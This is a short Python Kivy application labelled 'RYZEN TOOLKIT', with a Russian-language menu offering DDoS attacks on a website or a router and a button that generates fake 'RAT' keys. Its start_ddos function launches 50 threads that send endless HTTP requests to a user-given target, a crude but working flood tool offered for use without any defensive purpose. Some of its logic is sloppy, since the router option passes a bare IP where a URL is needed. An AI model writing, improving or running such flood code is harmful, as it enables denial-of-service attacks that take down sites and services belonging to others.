from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.uix.scrollview import ScrollView
import threading, requests, random, sys

class ToolkitApp(App):
    def build(self):
        self.layout = BoxLayout(orientation='vertical', padding=10, spacing=10)
        
        self.scroll = ScrollView(size_hint=(1, 0.8))
        self.log_label = Label(text="[color=00ff00]RYZEN TOOLKIT[/color]\n1. DDoS САЙТ\n2. DDoS РОУТЕР\n3. КЛЮЧИ\n6. ВЫХОД\n\nВыбор:", 
                               markup=True, size_hint_y=None, halign='left', valign='top')
        self.log_label.bind(texture_size=self.log_label.setter('size'))
        self.scroll.add_widget(self.log_label)
        
        self.input = TextInput(multiline=False, size_hint=(1, 0.1), font_size=20)
        self.input.bind(on_text_validate=self.on_enter)
        
        self.btn = Button(text="ОТПРАВИТЬ", size_hint=(1, 0.1), background_color=(0,0.5,0,1))
        self.btn.bind(on_press=self.on_enter)
        
        self.layout.add_widget(self.scroll)
        self.layout.add_widget(self.input)
        self.layout.add_widget(self.btn)
        return self.layout

    def log(self, text):
        self.log_label.text += "\n" + text

    def on_enter(self, instance):
        cmd = self.input.text.strip()
        self.input.text = ""
        self.log(f"> {cmd}")
        
        if cmd == "1":
            self.log("Введите URL:")
            self.input.bind(on_text_validate=self.start_ddos)
        elif cmd == "2":
            self.log("Введите IP:")
            self.input.bind(on_text_validate=self.start_ddos)
        elif cmd == "3":
            self.log(f"[color=00ff00]Ключ: RAT-{random.randint(1000,9999)}-{random.randint(1000,9999)}-{random.randint(1000,9999)}-{random.randint(1000,9999)}[/color]")
        elif cmd == "6":
            sys.exit()
        else:
            self.log("Неверно.")

    def start_ddos(self, instance):
        target = self.input.text.strip()
        self.input.text = ""
        self.log(f"Атака на {target}...")
        def flood():
            while True:
                try: requests.get(target, timeout=0.5)
                except: pass
        for _ in range(50):
            threading.Thread(target=flood, daemon=True).start()

if __name__ == '__main__':
    ToolkitApp().run()
